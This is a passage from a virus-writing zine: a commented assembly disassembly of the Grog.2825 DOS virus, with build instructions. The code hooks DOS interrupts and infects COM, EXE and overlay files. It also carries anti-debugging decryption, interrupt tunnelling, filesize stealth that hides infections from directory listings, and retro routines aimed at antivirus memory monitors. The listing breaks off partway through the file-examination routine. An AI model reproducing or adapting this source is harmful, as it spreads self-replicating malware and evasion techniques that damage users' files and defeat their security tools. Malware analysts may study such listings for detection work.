   ;                                         /-----------------------------\
   ;                                         | Xine - issue #3 - Phile 307 |
   ;                                         \-----------------------------/
   ;
   ;
   ; comment *
   ;                  Grog.2825
   ;                Disassembly by
   ;                 Darkman/29A
   ;
   ;   Grog.2825 is a 2825 bytes parasitic resident COM/EXE/Overlay virus. Infects
   ;   files at open file, close file, delete file, get or set file attributes,
   ;   load and/or execute program and extended open/create by prepending the virus
   ;   to the infected COM file and appending to the infected EXE/Overlay file.
   ;   Grog.2825 has an error handler, anti-tunneling, anti-debugging techniques,
   ;   interrupt stealth at interrupt 21h, filesize stealth, retro structures,
   ;   tunneling of interrupt 13h and interrupt 21h and is oligomorphic in file
   ;   using its internal oligomorphic engine. Grog.2825 is using the pointer to
   ;   address of interrupt 13h (disk) handler-, interrupt 21h (DOS functions) get
   ;   address of InDOS flag- and address of interrupt 40h (ROM BIOS diskette
   ;   handler relocated by hard disk BIOS) handler DOS exploits.
   ;
   ;   To compile Grog.2825 with Turbo Assembler v 4.0 type:
   ;     TASM /m GROG2825.ASM
   ;     TLINK /t /x GROG2825.OBJ
   ; *

   .model tiny
   .code
    org   100h              ; Origin of Grog.2825

   code_begin:
            xor     dx,dx       ; Zero DX
            mov     ds,dx       ; DS = segment of interrupt table
            mov     es,dx       ; ES = segment of interrupt table

            mov     si,(01h*04h)    ; SI = offset of interrupt vector 01h
            mov     di,si       ; DI =   "    "      "       "     "
            lodsw           ; AX = offset of interrupt 01h
            push    ax          ; Save AX at stack
            lodsw           ; AX = segment of interrupt 01h
            push    ax          ; Save AX at stack

            lea     ax,decryptor    ; AX = offset of decryptor
            stosw           ; Set interrupt offset 01h
            mov     ax,cs       ; AX = segment of decryptor
            stosw           ; Set interrupt segment 01h

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     cx,(crypt_end-crypt_begin)
            lea     si,crypt_begin  ; SI = offset of crypt_begin

            inc     dh          ; Set trap flag

            push    dx          ; Save DX at stack
            popf            ; Load flags from stack (DX)
   decrypt_loop:
            lodsb           ; AL = byte of encrypted code

            loop    decrypt_loop

            int     20h         ; Terminate program

   decryptor    proc    near        ; Anti-debugging decryptor
            mov     bp,sp       ; BP = stack pointer
            mov     di,[bp+00h]     ; DI = offset of decryptor loop

            cmp     byte ptr [di],0e2h  ; LOOP imm8 (opcode 0e2h)?
            jne     test_int20      ; Not equal? Jump to test_int20

            db      06h dup(90h)    ; Decryption algorithm
   decrypt_algo equ     word ptr $-04h  ;     "          "

            mov     [si-01h],al     ; Store byte of decrypted code
   decrypt_exit:
            iret            ; Interrupt return!
   test_int20:
            cmp     byte ptr [di],0cdh  ; INT 20h (opcode 0cdh,20h)?
            jne     decrypt_exit    ; Not equal? Jump to decrypt_exit
            endp
   crypt_begin:
            sti             ; Set interrupt-enable flag

            add     sp,06h      ; Correct stack pointer

            pop     word ptr [int01_addr+02h]
            pop     word ptr [int01_addr]

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)
   virus_exit:
            mov     ax,8e47h        ; Grog.2825 function
            int     21h

            mov     [retro_struc],01h   ; TbMem retro structures

            nop

            mov     word ptr [int40_addr],0ec59h
            mov     word ptr [int40_addr+02h],0f000h

            mov     ax,2e01h        ; Set verify flag (on)
            xor     dl,dl       ; Zero DL
            int     21h

            mov     ah,2fh      ; Get disk transfer area address
            int     21h
            push    es bx       ; Save registers at stack

            call    install

            lea     dx,dta      ; DX = offset of dta
            mov     ah,1ah      ; Set disk transfer area address
            call    int21_simula

            call    test_assign
            jne     infect_comma    ; ASSIGN not installed? Jump to in...

            mov     ax,601h         ; Get drive assignment table
            int     2fh
            mov     al,es:[105h]    ; AL = the drive which C: is mappe...

            push    ax          ; Save AX at stack
            mov     al,03h      ; Mappe drive C: to drive C:
            mov     es:[105h],al    ; Store which drive C: is mapped too
   infect_comma:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,c__command_c     ; DX = offset of c__command_c
            mov     ax,4300h        ; Get file attributes
            int     21h

            lea     dx,c__dos_comma     ; DX = offset of c__dos_comma
            mov     ax,4300h        ; Get file attributes
            int     21h

            call    test_assign
            jne     set_dta_addr    ; ASSIGN not installed? Jump to se...

            pop     ax          ; Load AX from stack
            mov     es:[105h],al    ; Store drive which C: is mapped to
   set_dta_addr:
            pop     dx ds       ; Load registers from stack
            mov     ah,1ah      ; Set disk transfer area address
            call    int21_simula

            jmp     virus_exit

   test_assign  proc    near        ; Test if ASSIGN is installed
            mov     ax,600h         ; ASSIGN installation check
            int     2fh
            cmp     al,0ffh         ; ASSIGN installed?

            ret             ; Return!
            endp

   install      proc    near        ; Tunnel, allocate memory, move vi...
            mov     ax,5500h        ; COMMAND.COM interface
            int     2fh
            mov     cs:[command_inst],ah

            mov     ah,34h      ; Get address of InDOS flag
            int     21h
            mov     cs:[tunnel_seg],es  ; Store segment of DOS data segment

            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            mov     ds:[01h*04h],offset tunneler
            mov     ds:[01h*04h+02h],cs ; Set interupt vector 01h

            mov     ax,3521h        ; Get interrupt vector 21h
            int     21h
            mov     ds:[21h*04h],bx     ; Set interrupt offset 21h
            mov     ds:[21h*04h+02h],es ; Set interrupt segment 21h

            push    ds:[20h*04h]    ; Get interrupt offset 20h
            pop     word ptr cs:[int20_addr]
            push    ds:[20h*04h+02h]    ; Get interrupt segment 20h
            pop     word ptr cs:[int20_addr+02h]

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     word ptr [int21_origin],bx
            mov     word ptr [int21_origin+02h],es

            mov     word ptr [int21_addr_],bx
            mov     word ptr [int21_addr_+02h],es

            xor     ax,ax       ; Zero AX
            push    ax          ; Save AX at stack
            inc     ah          ; Set trap flag
            push    ax          ; Save AX at stack

            push    ax          ; Save AX at stack
            popf            ; Load flags from stack (AX)

            mov     ax,4343h        ; Unknown function
            pushf           ; Save flags at stack
            call    [int21_addr_]

            push    word ptr [int21_addr_]
            pop     word ptr [int21_addr]
            push    word ptr [int21_addr_+02h]
            pop     word ptr [int21_addr+02h]

            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            les     bx,ds:[7b4h]    ; ES:BX = pointer to address of in...

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     word ptr [int13_addr],bx
            mov     word ptr [int13_addr+02h],es

            mov     [tunnel_seg],0f000h ; Store segment of interrupt 13h

            popf            ; Load flags from stack (AX)

            mov     ah,01h      ; Get status of last operation
            pushf           ; Save flags at stack
            call    [int13_addr]

            popf            ; Load flags from stack

            mov     ah,62h      ; Get current PSP address
            int     21h
            mov     es,bx       ; ES = segment of PSP for current ...

            mov     ah,49h      ; Free memory
            int     21h

            mov     bx,0ffffh       ; BX = number of paragraphs to all...
            mov     ah,48h      ; Allocate memory
            int     21h

            sub     bx,((code_end-code_begin+0fh)/10h+01h)*02h+01h
            mov     cx,es       ; ES = segment of PSP for current ...
            stc             ; Set carry flag
            adc     cx,bx       ; CX = segment of allocated block

            mov     ah,4ah      ; Resize memory block
            int     21h

            mov     bx,((code_end-code_begin+0fh)/10h+01h)*02h
            stc             ; Set carry flag
            sbb     es:[02h],bx     ; Store segment of first byte beyo...

            push    es          ; Save ES at stack
            mov     es,cx       ; ES = segment of allocated block
            mov     ah,4ah      ; Resize memory block
            int     21h

            mov     ax,es       ; AX = segment of allocated block
            dec     ax          ; Decrease AX
            mov     ds,ax       ; DS = segment of Memory Control B...

            mov     word ptr ds:[01h],08h

            mov     dx,10h      ; Multiply by paragraphs
            mul     dx          ; DX:AX = segment of Memory Contro...
            mov     bx,ax       ; BX = low-order word of segment o...
            mov     cx,dx       ; CX = high-order word of segment ...
            pop     ds          ; Load DS from stack (ES)

            mov     ax,ds       ; AX = segment of PSP for current ...
            mov     dx,10h      ; Multiply by paragraphs
            mul     dx          ; DX:AX = segment of PSP for curre...
            add     ax,ds:[06h]     ; Add segment address of next memo...
            adc     dx,00h      ; Convert to 32-bit

            sub     ax,bx       ; Subtract segment of Memory Contr...
            sbb     dx,cx       ; Convert to 32-bit
            jb      move_virus      ; Below? Jump to move_virus

            sub     ds:[06],ax      ; Store new segment address of nex...
   move_virus:
            lea     si,code_begin   ; SI = offset of code_begin
            xor     di,di       ; Zero DI

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     cx,(code_end-code_begin)
            rep     movsb       ; Move virus to top of memory

            mov     ah,62h      ; Get current PSP address
            int     21h
            dec     bx          ; Decrease BX
            mov     ds,bx       ; DS = segment of Memory Control B...

            mov     byte ptr ds:[00h],'Z'

            xor     ax,ax       ; Zero AX

            push    ax          ; Save AX at stack
            pop     ds          ; Load DS from stack (AX)

            mov     ax,es       ; AX = segment of allocated block
            sub     ax,10h      ; Subtract ten from segment of all...
            mov     es,ax       ; ES = segment of allocated block ...

            cli             ; Clear interrupt-enable flag
            mov     ds:[20h*04h],offset int20_virus
            mov     ds:[20h*04h+02h],es ; Set interrupt vector 20h
            mov     ds:[21h*04h],offset int21_virus
            mov     ds:[21h*04h+02h],es ; Set interrupt vector 21h
            sti             ; Set interrupt-enable flag

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            ret             ; Return!
            endp

   tunneler     proc    near        ; Interrupt 13h/interrupt 21h tunn...
            push    ax bx       ; Save registers at stack

            mov     bx,cs       ; BX = code segment
            call    test_segment
            cmp     bh,00h      ; Not equal to data- or extra seg...?
            je      tst_zero_seg    ; Equal? Jump to tst_zero_seg

            jmp     code_seg_tst
   tst_zero_seg:
            xor     bx,bx       ; BX = segment of interrupt table
            call    test_segment
            cmp     bh,00h      ; Not equal to data- or extra seg...?
            je      test_cs_seg     ; Equal? Jump to test_cs_seg

            jmp     zero_seg_tst
   test_cs_seg:
            pop     bx ax       ; Load registers from stack

            push    bp          ; Save BP at stack
   test_cs_seg_:
            mov     bp,sp       ; BP = stack pointer

            cmp     [bp+04h],0f000h     ; Segment of tunneled interrupt?
   tunnel_seg   equ     word ptr $-02h  ; Segment of tunneled interrupt
            jne     test_opcode     ; Not equal? Jump to test_opcode

            push    ax es       ; Save registers at stack

            les     ax,[bp+02h]     ; ES:AX = pointer to interrupt
            mov     word ptr cs:[tunnel_addr],ax
            mov     word ptr cs:[tunnel_addr+02h],es

            pop     es ax       ; Load registers from stack

            and     [bp+06h],1111111011111111b

            jmp     tunnel_exit_

            nop
   test_opcode:
            push    ds si ax        ; Load registers from stack

            lds     si,[bp+02h]     ; DS:SI = pointer to interrupt

            push    si          ; Save SI at stack
            mov     ax,ds       ; AX = data segment
            mov     si,cs       ; SI = code segment
            cmp     ax,si       ; Code segment equal to data segment?
            pop     si          ; Load SI from stack
            je      tunnel_exit     ; Equal? Jump to tunnel_exit

            lodsw           ; AX = opcode of interrupt
            cmp     al,9dh      ; POPF (opcode 9dh)?
            jne     test_pushf      ; Not equal? Jump to test_pushf

            or      [bp+08h],0000000100000000b

            jmp     tunnel_exit

            nop
   test_pushf:
            cmp     al,9ch      ; PUSHF (opcode 9ch)?
            jne     test_iret       ; Not equal? Jump to test_iret

            jmp     pushf_simula
   test_iret:
            cmp     al,0cfh         ; IRET (opcode 0cfh)?
            jne     test_dec_sp     ; Not equal? Jump to test_dec_sp

            or      [bp+0ch],0000000100000000b
   tunnel_exit:
            pop     ax si ds        ; Load registers from stack
   tunnel_exit_:
            pop     bp          ; Load BP from stack

            iret            ; Interrupt return!
   test_dec_sp:
            cmp     al,4ch      ; DEC SP (opcode 4ch)?
            jne     test_int        ; Not equal? Jump to test_int

            mov     ax,[bp+02h]     ; AX = instruction pointer of inte...
            inc     ax          ; Increase AX
            mov     [bp+02h],ax     ; Store instruction pointer of int...

            push    di          ; Save DI at stack

            push    ss          ; Save SS at stack
            pop     ds          ; Load DS from stack (SS)

            mov     si,sp       ; SI = stack pointer
            mov     di,bp       ; DI = stack pointer
            add     di,08h      ; DI = offset of end of stack
   move_stack:
            lodsw           ; AL = word of stack
            mov     [si-03h],ax     ; Store word of stack

            cmp     si,di       ; End of stack?
            jne     move_stack      ; Not equal? Jump to move_stack

            mov     al,01000011b    ; AL = low-order byte of flags
            mov     [bp+07h],al     ; Store low-order byte of flags

            dec     sp          ; Decrease SP

            pop     di          ; Load DI from stack

            pop     ax si ds        ; Load registers from stack

            jmp     test_cs_seg_
   test_int:
            cmp     cs:[command_inst],00h
            jne     tunnel_exit     ; Not equal? Jump to tunnel_exit

            cmp     al,0cdh         ; INT? (opcode 0cdh)?
            jne     test_int03      ; Not equal? Jump to test_int03

            mov     si,[bp+02h]     ; SI = instruction pointer of inte...
            inc     si          ; Increase SI
            inc     si          ; Increase SI
            mov     [bp+02h],si     ; Store instruction pointer of int...
   int_simulati:
            xor     si,si       ; Zero SI
            mov     ds,si       ; DS = segment of interrupt table

            mov     al,ah       ; AL = interrupt number
            xor     ah,ah       ; Zero AH
            shl     ax,01h      ; Calculate offset of interrupt ve...
            shl     ax,01h      ;     "       "    "      "       "
            mov     si,ax       ; SI = offset of interrupt vector

            push    es di       ; Save registers at stack

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     di,int_addr     ; DI = offset of int_addr
            movsw           ; Get interrupt vector
            movsw           ;  "      "       "

            pop     di es       ; Load registers from stack

            pop     ax si ds        ; Load registers from stack

            push    [bp+06h]        ; Save flags at stack
            popf            ; Load flags from stack

            pop     bp          ; Load BP from stack

            db      0eah        ; JMP imm32 (opcode 0eah)
   int_addr     dd      ?           ; Address of interrupt
   test_int03:
            cmp     al,0cch         ; INT 03h (opcode 0cch)?
            jne     tunnel_exit     ; Not equal? Jump to tunnel_exit

            mov     ax,[bp+02h]     ; AX = instruction pointer of inte...
            inc     ax          ; Increase AX
            mov     [bp+02h],ax     ; Store instruction pointer of int...

            mov     ax,03cdh        ; INT 03h (opcode 0cdh,03h)

            jmp     int_simulati
   code_seg_tst:
            pop     bx ax       ; Load registers from stack

            push    bp ds       ; Save registers at stack

            lea     bp,int24_exit   ; BP = offset of int24_exit
            mov     ds,bp       ; DS =   "    "      "
            lea     bp,tunneler     ; BP = offset of tunneler
            call    exam_mod_reg

            pop     ds          ; Load DS from stack

            jmp     test_cs_seg_
   zero_seg_tst:
            pop     bx ax       ; Load registers from stack

            push    bp          ; Save BP at stack

            push    ds          ; Save DS at stack

            lea     bp,int01_addr   ; BP = offset of int01_addr
            mov     ds,bp       ; DS =   "    "      "
            mov     bp,(01h*04h)    ; BP = offset of interrupt vector 01h
            call    exam_mod_reg

            pop     ds          ; Load DS from stack

            cmp     bp,05h      ; Found offset of interrupt table?
            je      tst_data_seg    ; Equal? Jump to tst_data_seg

            jmp     test_cs_seg_
   tst_data_seg:
            push    ax          ; Save AX at stack

            push    cs          ; Save CS at stack

            mov     ax,ds       ; AX = data segment
            or      ax,ax       ; Segment of interrupt vector table?
            jz      mov_cs_to_ds    ; Zero? Jump to mov_cs_to_ds

            pop     es          ; Load ES from stack (CS)

            jmp     jump_test_cs

            nop
   mov_cs_to_ds:
            pop     ds          ; Load DS from stack (CS)
   jump_test_cs:
            pop     ax          ; Load AX from stack

            jmp     test_cs_seg_
   pushf_simula:
            mov     ax,[bp+02h]     ; AX = instruction pointer of inte...
            inc     ax          ; Increase AX
            mov     [bp+02h],ax     ; Store instruction pointer of int...

            push    di ds       ; Save registers at stack

            push    ss          ; Save SS at stack
            pop     ds          ; Load DS from stack (SS)

            mov     si,sp       ; SI = stack pointer
            mov     di,bp       ; DI = stack pointer
            add     di,08h      ; DI = offset of end of stack
   move_stack_:
            lodsw           ; AL = word of stack
            mov     [si-04h],ax     ; Store word of stack

            cmp     si,di       ; End of stack?
            jne     move_stack_     ; Not equal? Jump to move_stack_

            dec     sp          ; Decrease SP
            dec     sp          ;    "     "

            pop     ds di       ; Load registers from stack

            push    [bp+04h]        ; Save flags at stack
            pop     [bp+06h]        ; Load flags from stack

            and     [bp+06h],1111111011111111b

            pop     ax si ds        ; Load registers from stack

            jmp     test_cs_seg_

   test_segment proc    near        ; Test data- and extra segment
            mov     ax,ds       ; AX = data segment
            cmp     ax,bx       ; Equal to data segment
            jne     test_es_seg     ; Not equal? Jump to test_es_seg

            mov     bh,01h      ; Segment found

            ret             ; Return!
   test_es_seg:
            mov     ax,es       ; AX = extra segment
            cmp     ax,bx       ; Equal to extra segment?
            jne     not_equal       ; Not equal? Jump to not_equal

            mov     bh,01h      ; Segment found

            ret             ; Return!
   not_equal:
            mov     bh,00h      ; Segment not found

            ret             ; Return!
            endp

   exam_mod_reg proc    near        ; Examine and if found, modify reg...
            cmp     ax,bp       ; Equal to test register value?
            jne     exam_bx_reg     ; Not equal? Jump to exam_bx_reg

            mov     ax,ds       ; AX = new register value

            jmp     found_reg

            nop
   exam_bx_reg:
            cmp     bx,bp       ; Equal to test register value?
            jne     exam_cx_reg     ; Not equal? Jump to exam_cx_reg

            mov     bx,ds       ; BX = new register value

            jmp     found_reg

            nop
   exam_cx_reg:
            cmp     cx,bp       ; Equal to test register value?
            jne     exam_dx_reg     ; Not equal? Jump to exam_dx_reg

            mov     cx,ds       ; CX = new register value

            jmp     found_reg

            nop
   exam_dx_reg:
            cmp     dx,bp       ; Equal to test register value?
            jne     exam_si_reg     ; Not equal? Jump to exam_si_reg

            mov     dx,ds       ; DX = new register value

            jmp     found_reg

            nop
   exam_si_reg:
            cmp     si,bp       ; Equal to test register value?
            jne     exam_di_reg     ; Not equal? Jump to exam_di_reg

            mov     si,ds       ; SI = new register value

            jmp     found_reg

            nop
   exam_di_reg:
            cmp     di,bp       ; Equal to test register value?
            jne     exam_reg_xit    ; Not equal? Jump to exam_reg_xit

            mov     di,ds       ; DI = new register value
   found_reg:
            inc     bp          ; BP = found test register value
   exam_reg_xit:
            ret             ; Return!
            endp
            endp
   dta_stealth:
            call    int21_simula
            jc      dta_ste_exit    ; Error? Jump to dta_ste_exit

            push    ds es ax bx cx si   ; Save registers at stack

            cld             ; Clear direction flag

            mov     ah,2fh      ; Get disk transfer area address
            call    int21_simula

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     si,bx       ; SI = offset of disk transfer area
            add     si,16h      ; SI = offset of file time
            lodsb           ; AL = file time

            and     al,00011111b    ; AL = seconds of file time
            cmp     al,00010001b    ; Infected (34 seconds)?
            jne     dta_dont_ste    ; Not infected? Jump to dta_dont_ste

            add     si,07h      ; SI = offset of filename

            push    si          ; Save SI at stack
   find_zero:
            lodsb           ; AL = byte of filename
            cmp     al,00h      ; End of filename?
            jne     find_zero       ; Not equal? Jump to find_zero

            sub     si,04h      ; SI = offset of extension
            lodsb           ; AL = byte of filename
            pop     si          ; Load SI from stack

            and     al,01011111b    ; Upcase character
            cmp     al,'E'              ; EXE executable?
            je      dta_e_o_test    ; Equal? Jump to dta_e_o_test
            cmp     al,'O'              ; Overlay executable?
            je      dta_e_o_test    ; Equal? Jump to dta_e_o_test
            cmp     al,'C'              ; COM executable?
            jne     dta_dont_ste    ; Not equal? Jump to dta_dont_ste

            cmp     [si-04h],(code_end-code_begin)*02h+100h
            jb      dta_dont_ste    ; Filesize too small? Jump to dta_...

            sub     [si-04h],(code_end-code_begin)

            jmp     dta_dont_ste
   dta_e_o_test:
            cmp     word ptr [si-02h],00h
            jne     dta_e_o_stea    ; Filesize not too small? Jump to ...
            cmp     [si-04h],(code_end-code_begin)*02h+100h
            jb      dta_dont_ste    ; Filesize too small? Jump to dta_...
   dta_e_o_stea:
            sub     [si-04h],(code_end-code_begin+110h)
            sbb     word ptr [si-02h],00h
   dta_dont_ste:
            pop     si cx bx ax es ds   ; Load registers from stack

            clc             ; Clear carry flag
   dta_ste_exit:
            retf    02h         ; Return far and pop a word!
   fcb_stealth:
            call    int21_simula
            cmp     al,00h      ; Match not found?
            jne     fcb_ste_exit    ; Not equal? Jump to fcb_ste_exit

            push    es ax bx        ; Save registers at stack

            mov     ah,51h      ; Get current PSP address
            call    int21_simula
            mov     es,bx       ; ES = segment of PSP for current ...
            cmp     bx,es:[16h]     ; Parent PSP equal to current PSP?
            jne     fcb_dont_ste    ; Not equal? Jump to fcb_dont_ste

            mov     bx,dx       ; BX = offset of unopened FCB
            mov     al,[bx]         ; AL = extended FCB

            push    ax          ; Save AX at stack
            mov     ah,2fh      ; Get disk transfer area address
            call    int21_simula
            pop     ax          ; Load AX from stack

            inc     al          ; Extended FCB?
            jne     not_extended    ; Not equal? Jump to not_extended

            add     bx,07h      ; BX = offset of normal FCB
   not_extended:
            mov     ax,es:[bx+17h]  ; AX = file time
            and     al,00011111b    ; AL = seconds of file time
            cmp     al,00010001b    ; Infected (34 seconds)?
            jne     fcb_dont_ste    ; Not infected? Jump to fcb_dont_ste

            mov     al,es:[bx+09h]  ; AL = byte of filename
            and     al,01011111b    ; Upcase character
            cmp     al,'E'              ; EXE executable?
            je      fcb_e_o_test    ; Equal? Jump to fcb_e_o_test
            cmp     al,'O'              ; Overlay executable?
            je      fcb_e_o_test    ; Equal? Jump to fcb_e_o_test
            cmp     al,'C'              ; COM executable?
            jne     fcb_dont_ste    ; Not equal? Jump to fcb_dont_ste

            cmp     es:[bx+1dh],(code_end-code_begin)*02h+100h
            jb      fcb_dont_ste    ; Filesize too small? Jump to fcb_...

            sub     es:[bx+1dh],(code_end-code_begin)

            jmp     fcb_dont_ste
   fcb_e_o_test:
            cmp     word ptr es:[bx+1fh],00h
            jne     fcb_e_o_stea    ; Filesize not too small? Jump to ...
            cmp     es:[bx+1dh],(code_end-code_begin)*02h+100h
            jb      fcb_dont_ste    ; Filesize too small? Jump to fcb_...
   fcb_e_o_stea:
            sub     es:[bx+1dh],(code_end-code_begin+110h)
            sbb     word ptr es:[bx+1fh],00h
   fcb_dont_ste:
            pop     bx ax es        ; Load registers from stack
   fcb_ste_exit:
            iret            ; Interrupt return!
   jmp_dta_stea:
            jmp     dta_stealth
   jmp_fcb_stea:
            jmp     fcb_stealth

   int21_virus  proc    near        ; Interrupt 21h of Grog.2825
            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            cli             ; Clear interrupt-enable flag
            mov     [bp-02h],'Gg'       ; Store 'Gg' at stack
            cmp     [bp-02h],'Gg'       ; Tunneling?
            sti             ; Set interrupt-enable flag
            pop     bp          ; Load BP from stack
            je      jmp_tst_vir_    ; No tunneling? Jump to jmp_tst_vir_

            iret            ; Interrupt return!
   jmp_tst_vir_:
            jmp     tst_vir_func
   test_functio:
            cld             ; Clear direction flag

            cmp     ah,4eh      ; Find first matching file (DTA)?
            je      jmp_dta_stea    ; Equal? Jump to jmp_dta_stea
            cmp     ah,4fh      ; Find next matching file (DTA)?
            je      jmp_dta_stea    ; Equal? Jump to jmp_dta_stea
            cmp     ah,11h      ; Find first matching file (DTA)?
            je      jmp_fcb_stea    ; Equal? Jump to jmp_fcb_stea
            cmp     ah,12h      ; Find next matching file (DTA)?
            je      jmp_fcb_stea    ; Equal? Jump to jmp_fcb_stea

            cmp     ax,2521h        ; Set interrupt vector 21h?
            jne     tst_get_int_    ; Not equal? Jump to tst_get_int_

            mov     word ptr cs:[int21_origin],dx
            mov     word ptr cs:[int21_origin+02h],ds

            iret            ; Interrupt return!
   tst_get_int_:
            cmp     ax,3521h        ; Get interrupt vector 21h?
            jne     tst_grog_fun    ; Not equal? Jump to tst_grog_fun

            mov     bx,word ptr cs:[int21_origin]
            mov     es,word ptr cs:[int21_origin+02h]

            iret            ; Interrupt return!
   tst_grog_fun:
            cmp     ax,8e47h        ; Grog.2825 function?
            je      grog_functi_    ; Equal? Jump to grog_functi_
            cmp     ax,8e67h        ; Grog.2825 function?
            je      grog_functi     ; Equal? Jump to grog_functi

            cmp     ah,3dh      ; Open file?
            je      jmp_tst_clos    ; Equal? Jump to jmp_tst_clos
            cmp     ah,41h      ; Delete file?
            je      jmp_tst_clos    ; Equal? Jump to jmp_tst_clos
            cmp     ah,43h      ; Get or set file attributes?
            je      jmp_tst_clos    ; Equal? Jump to jmp_tst_clos
            cmp     ah,4bh      ; Load and/or execute program?
            je      jmp_tst_clos    ; Equal? Jump to jmp_tst_clos
            cmp     ah,56h      ; Rename file?
            je      jmp_tst_clos    ; Equal? Jump to jmp_tst_clos
            cmp     ax,6c00h        ; Extended open/create?
            je      jmp_tst_clos    ; Equal? Jump to jmp_tst_clos
            cmp     ah,3eh      ; Close file?
            je      jmp_tst_clos    ; Equal? Jump to jmp_tst_clos
   int21_exit:
            db      0eah        ; JMP imm32 (opcode 0eah)
   int21_origin dd      ?           ; Address of interrupt 21h
            endp
   jmp_tst_clos:
            jmp     test_close
   grog_functi:
            add     sp,06       ; Correct stack pointer

            jmp     int20_exit
   grog_functi_:
            pop     ax ds ax        ; Load registers from stack

            xor     ax,ax       ; Zero AX
            mov     es,ax       ; ES = segment of interrupt table
            push    word ptr [int01_addr]
            pop     es:[01h*04h]    ; Set interrupt offset 01h
            push    word ptr [int01_addr+02h]
            pop     es:[01h*04h+02h]    ; Set interrupt segment 01h

            push    ds          ; Save DS at stack
            pop     es          ; Load ES from stack (DS)

            cmp     [com_exe_ov],01h    ; EXE/Overlay executable?
            je      exe_ov_exit     ; Equal? Jump to exe_ov_exit

            mov     si,[origin_off]     ; SI = offset of original code of ...
            mov     ax,100h         ; AX = offset of beginning of code
            add     si,ax       ; SI = offset of original code
            mov     di,ax       ; DI = offset of beginning of code
            mov     cx,(code_end-code_begin)

            push    ds ax       ; Save registers at stack

            rep     movsb       ; Move the original code
   test_retro:
            cmp     cs:[retro_struc],00h
            mov     cs:[retro_struc],00h
            nop
            je      zero_regs       ; No TbMem retro structures? Jump ...

            push    ds es       ; Save segments at stack
            mov     dl,00h      ; Windows enhanced-mode initializa...
            mov     ax,1605h        ; Windows enhanced mode & 286 DOSx...
            int     2fh
            mov     ax,es       ; AX = segment of startup info str...
            cmp     ax,70h      ; Segment of DOS?
            je      dont_retro      ; Equal? Jump to dont_retro

            mov     al,2fh      ; Interrupt 2fh (multiplex)
            call    tbmem_retro

            mov     al,09h      ; Interrupt 09h (keyboard data ready)
            call    tbmem_retro
   dont_retro:
            pop     es ds       ; Load segments from stack
   zero_regs:
            xor     ax,ax       ; Zero AX
            mov     bx,ax       ; Zero BX
            mov     cx,ax       ; Zero CX
            mov     dx,ax       ; Zero DX
            mov     bp,ax       ; Zero BP
            mov     si,100h         ; SI = offset of beginning of code
            mov     di,si       ; DI =   "    "      "     "   "

            retf            ; Return far!
   exe_ov_exit:
            mov     cx,(stack_seg-code_begin)
            mov     di,100h         ; DI = offset of beginning of code
            mov     al,'G'
            rep     stosb       ; Overwrite virus with the charact...

            mov     ah,62h      ; Get current PSP address
            call    int21_simula

            add     bx,10h      ; BX = segment of beginning of code
            add     [origin_cs],bx  ; Add segment of beginning of code
            add     [stack_seg],bx  ; Add segment of beginning of code

            cli             ; Clear interrupt-enable flag
            mov     ss,[stack_seg]  ; SS = stack segment
            mov     sp,[stack_ptr]  ; SP = stack pointer
            sti             ; Set interrupt-enable flag

            push    [origin_cs]     ; Save original code segment at st...
            push    [origin_ip]     ; Save original intruction pointer...

            sub     bx,10h      ; BX = segment of PSP for current ...
            mov     ds,bx       ; DS =    "    "   "   "     "     "
            mov     es,bx       ; ES =    "    "   "   "     "     "

            jmp     test_retro
   test_close:
            push    ax bx cx dx si di bp ds es

            cmp     ah,3eh      ; Close file?
            jne     not_close       ; Not equal? Jump to not_close

            cmp     bx,05h      ; Standard file handle?
            jb      int21_exit_     ; Below? Jump to int21_exit_

            mov     bp,bx       ; BP = file handle

            jmp     tst_ext_open

            nop
   not_close:
            xor     bp,bp       ; Zero BP
   tst_ext_open:
            cmp     ah,6ch      ; Extended open/create?
            jne     not_ext_open    ; Not equal? Jump to not_ext_open

            mov     dx,si       ; DX = offset of filename
   not_ext_open:
            call    prepare_exam
   int21_exit_:
            pop     es ds bp di si dx cx bx ax

            jmp     int21_exit

   prepare_exam proc    near        ; Prepare filename examination
            mov     ax,3524h        ; Get interrupt vector 24h
            call    int21_simula
            push    bx es       ; Save registers at stack

            push    ds dx       ; Save registers at stack

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,int24_virus  ; DX = offset of int24_virus
            mov     ax,2524h        ; Set interrupt vector 24h
            call    int21_simula

            call    xchg_i13_i40

            pop     dx ds       ; Load registers from stack

            cmp     bp,00h      ; Close file?
            jne     not_close_      ; Not equal? Jump to not_close_

            mov     ax,3d00h        ; Open file (read)
            call    int21_simula
            jc      prepare_exit    ; Error? Jump to prepare_exit

            jmp     call_examine
   not_close_:
            mov     ax,bp       ; AX = file handle
   call_examine:
            call    examine_file

            mov     ah,3eh      ; Close file
            call    int21_simula
   prepare_exit:
            call    xchg_i13_i40

            pop     ds dx       ; Load registers from stack
            mov     ax,2524h        ; Set interrupt vector 24h
            call    int21_simula

            ret             ; Return!
            endp

   examine_file proc    near        ; Examine COM/EXE/Overlay file
            xchg    ax,bx       ; BX = file handle

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            push    bx          ; Save BX at stack
            mov     ax,1220h        ; Get system file table number
            int     2fh
            jc      pop_bx_exit     ; Error? Jump to pop_bx_exit

            mov     ax,1216h        ; Get address of system FCB
            mov     bl,es:[di]      ; BL = system file table entry
            int     2fh
   pop_bx_exit:
            pop     bx          ; Load BX from stack
            jc      examine_exit    ; Error? Jump to examine_exit

            mov     [sft_offset],di     ; Store offset of system file table
            mov     [sft_segment],es    ; Store segment of system file table

            mov     word ptr es:[di+15h],00h
            mov     word ptr es:[di+17h],00h

            cmp     es:[di+28h],'VO'    ; Overlay executable?
            je      examine_name    ; Equal? Jump to examine_name

